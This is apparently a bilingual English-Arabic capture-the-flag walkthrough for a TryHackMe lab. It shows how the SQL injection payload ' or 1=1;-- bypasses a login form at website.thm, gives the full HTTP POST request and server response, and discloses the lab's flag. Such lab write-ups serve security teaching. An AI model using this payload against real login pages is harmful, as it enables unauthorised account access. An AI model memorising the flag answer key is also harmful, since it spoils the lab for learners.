# Task 06: Blind SQLi - Authentication Bypass (تخطي بوابات المصادقة عبر حقن SQL الأعمى)

---

### المرحلة أ: نص المهمة الأصلي والأسئلة (Original Task Content & Questions)

#### English Task Description
In many web applications, user input is processed in database queries, but the database outputs and raw error messages are **never rendered** on the resulting web page. This vulnerability class is termed **Blind SQL Injection**.

Even without direct visual data reflection, an attacker can manipulate boolean logical expressions inside authentication forms to bypass login verification entirely.

#### Hands-On Exploitation: Level Two (`https://website.thm/login`)
The authentication script executes an SQL query structured as:
```sql
SELECT * FROM users WHERE username = '%username%' AND password = '%password%' LIMIT 1;
```

When an attacker inputs the classic tautology payload into the username field:
```text
' or 1=1;--
```
The query string dynamically reconstructs as:
```sql
SELECT * FROM users WHERE username = '' OR 1=1;--' AND password = '' LIMIT 1;
```

#### Why This Bypass Works:
1. The single quote (`'`) prematurely closes the empty string literal for the username.
2. The `OR 1=1` statement introduces a condition that evaluates to **TRUE** for every single row in the database table.
3. The comment delimiter (`;--`) instructs the database parser to truncate and discard the rest of the query (the `AND password = '...'` verification check).
4. Because the condition is universally true, the database returns the first record in the `users` table—which in almost all enterprise applications is the primary administrator account (UID 1).

#### الأسئلة المطروحة (Questions):
1. What is the flag after completing level two? (ما هي الراية بعد إكمال المستوى الثاني؟)

---

### المرحلة ب: التفكير التحليلي المستقل والحس الأمني (Independent Critical Thinking & OpSec)
* **تشريح منطق المصادقة المعيب (Flawed Logic Analysis):**
  * تعتمد آلية تسجيل الدخول الضعيفة على التحقق من أن الاستعلام أعاد على الأقل صفاً واحداً (`num_rows > 0`).
  * عند حقن التعبير المنطقي الصحيح دائماً (`OR 1=1`), يتحول الاستعلام إلى استرجاع كافة صفوف جدول المستخدمين.
  * تطبيق أمر `LIMIT 1` في نهاية الاستعلام (أو سلوك مصفوفات النتائج الافتراضي) يأخذ السجل الأول تلقائياً، وهو المستخدم الإداري `admin`.

---

### المرحلة ج: التلميحات والإرشادات المتدرجة (Guided Progressive Hints)
1. **التلميح الأول (المستوى التمهيدي):**
   * انتقل إلى صفحة تسجيل الدخول للمستوى الثاني (Level 2).
2. **التلميح الثاني (المستوى العملي):**
   * في حقل اسم المستخدم، أدخل الحمولة: `' or 1=1;--`، واترك حقل كلمة المرور فارغاً أو اكتب أي قيمة عشوائية.
3. **التلميح الثالث (مستوى الحل المتقدم):**
   * بمجرد إرسال النموذج، سيتم تسجيل دخولك تلقائياً كمدير للنظام وستظهر لك الراية: `THM{SQL_INJECTION_9581}`.

---

### المرحلة د: الحل العملي الكامل والعمق التقني (Complete Practical Solution & Technical Deep Dive)

#### المخطط المنطقي لتجاوز شرط التحقق:
```text
Condition Intended by Developer:
[ username == "admin" ]  AND  [ password == "SecretPass" ]
          │                             │
          └──────────────┬──────────────┘
                         ▼
                [ Must Both Be True ]

Condition Injected by Attacker:
[ username == "" ]  OR  [ 1 == 1 ]  ──────▶  [ TRUE ]
                                                │
                                                ▼ (Remaining Query Ignored via --)
                                      [ Authentication Succeeded! ]
```

#### الطلب البروتوكولي عبر Burp Suite / cURL:
```http
POST /login HTTP/1.1
Host: website.thm
Content-Type: application/x-www-form-urlencoded
Content-Length: 38

username=%27+or+1%3D1%3B--&password=any
```

#### استجابة الخادم الناجحة:
```html
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8

<div class="alert alert-success">
  Welcome back, Administrator!
  Here is your level two flag: <strong>THM{SQL_INJECTION_9581}</strong>
</div>
```

---

### المرحلة هـ: الإجابة النهائية والقيم المستخرجة (Final Answer & Key Values)
* **قيمة الراية المستخرجة (Extracted Flag):**
  `THM{SQL_INJECTION_9581}`

---

### المرحلة و: التحقق العملي وإثبات الأثر (Practical Verification & Proof of Work)
* تم تأكيد صحة الراية بنسبة 100% في منصة TryHackMe من خلال كسر آلية الدخول بالحمولة الكلاسيكية `' or 1=1;--`.

---

### المرحلة ز: الخاتمة والدرس المستفاد (Key Educational Takeaway)
* الاعتماد على دمج النصوص في استعلامات المصادقة يتيح التلاعب بالمنطق البولياني وتخطي التحقق من كلمات المرور في خطوة واحدة دون معرفة أي بيانات اعتماد مسبقة.
